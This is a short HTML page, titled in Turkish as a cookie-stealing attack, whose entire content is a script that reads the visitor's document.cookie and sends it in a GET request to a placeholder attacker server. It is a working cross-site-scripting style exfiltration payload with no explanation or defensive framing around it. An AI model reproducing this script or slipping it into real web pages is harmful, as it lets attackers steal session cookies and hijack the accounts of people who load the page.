<html>
<head>
<title>Cookie Çalma Saldırısı</title>
</head>
<body>
<script>
// Cookie'leri al ve bir HTTP isteğiyle gönder
var cookies = document.cookie;
var xhr = new XMLHttpRequest();
xhr.open("GET", "http://saldırgan-sunucu.com/cookieleri-gonder?cookies=" + encodeURIComponent(cookies), true);
xhr.send();
</script>
</body>
</html>
